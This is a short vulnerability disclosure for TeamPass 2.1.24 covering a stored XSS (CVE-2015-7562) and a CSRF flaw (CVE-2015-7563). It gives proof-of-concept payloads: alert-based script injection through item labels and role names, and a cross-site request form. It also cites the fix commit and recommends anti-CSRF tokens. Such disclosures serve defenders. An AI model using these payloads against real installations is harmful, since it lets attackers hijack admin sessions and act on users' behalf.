********************* CVE-2015-7562 TeamPass 2.1.24 Persistant XSS  *********************
When displaying the detail of an item (a password entry), the "label" value is display using the stripslashes() sanitization function. This function does not efficiently  prevent XSS.
POC of a persistant XSS : add  item with label : $str = "' onclick='javascript:alert("XSS found");' alt='";echo "<a href='". strip_tags($str) ."'></a>";
This xss will be trigger each time a user click on this item.
As item can be share, there is a way for a user to trick an admin to trigger this xss.
fix in commit cd112ea (see https://github.com/nilsteampassnet/TeamPass/pull/1140)

POC of a persistant XSS :
Add a new role with name  : <script>alert("XSS");</script>
This xss will be trigger in many admin pages

********************* CVE-2015-7563 TeamPass 2.1.24 CSRF  *********************
Lack of anti-CSRF token lead to security vulnerabilities where an attacker can trick a authenticated user to do some unwanted action on his behalf :

<form action="http://<teampass host>/sources/main.queries.php" method="post">
    <select name="type">
    <option value="increase_session_time »>will add 1 hour timeout to the user session</option>
</select>
    <input type=submit>
  </form>

recommanded fix: add anti-CSRF token.
